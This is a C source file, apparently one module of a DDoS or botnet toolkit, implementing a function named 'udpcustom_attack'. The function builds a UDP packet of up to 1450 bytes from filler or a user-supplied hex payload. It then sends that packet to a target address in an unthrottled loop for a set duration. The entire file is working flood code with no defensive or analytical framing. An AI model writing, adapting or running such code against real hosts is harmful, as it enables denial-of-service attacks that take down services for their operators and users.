#define _GNU_SOURCE

#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <stdio.h>

#include "udpcustom_attack.h"

static int hex_to_bytes(const char *hex_str, uint8_t *bytes, size_t max_len) {
    size_t len = strlen(hex_str);
    if (len % 2 != 0 || len / 2 > max_len) return -1;
    
    for (size_t i = 0; i < len; i += 2) {
        sscanf(hex_str + i, "%2hhx", &bytes[i/2]);
    }
    return len / 2;
}

void* udpcustom_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    if (params->psize <= 0 || params->psize > 1450) {
        params->psize = 1450;
    }

    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0) return NULL;

    char *data = malloc(params->psize);
    if (!data) {
        close(fd);
        return NULL;
    }

    memset(data, 0xFF, params->psize);

    if (params->payload && strlen(params->payload) > 0) {
        uint8_t *decoded_payload = malloc(params->psize);
        if (decoded_payload) {
            int payload_len = hex_to_bytes(params->payload, decoded_payload, params->psize);
            if (payload_len > 0) {
                memcpy(data, decoded_payload, payload_len);
                if (payload_len < params->psize) {
                    memset(data + payload_len, 0xFF, params->psize - payload_len);
                }
            } else {
                size_t copy_len = strlen(params->payload);
                if (copy_len > params->psize) copy_len = params->psize;
                memcpy(data, params->payload, copy_len);
            }
            free(decoded_payload);
        }
    }

    time_t end_time = time(NULL) + params->duration;

    while (time(NULL) < end_time && params->active) {
        sendto(fd, data, params->psize, MSG_NOSIGNAL, (struct sockaddr *)&params->target_addr, sizeof(params->target_addr));
    }

    close(fd);
    free(data);
    return NULL;
}
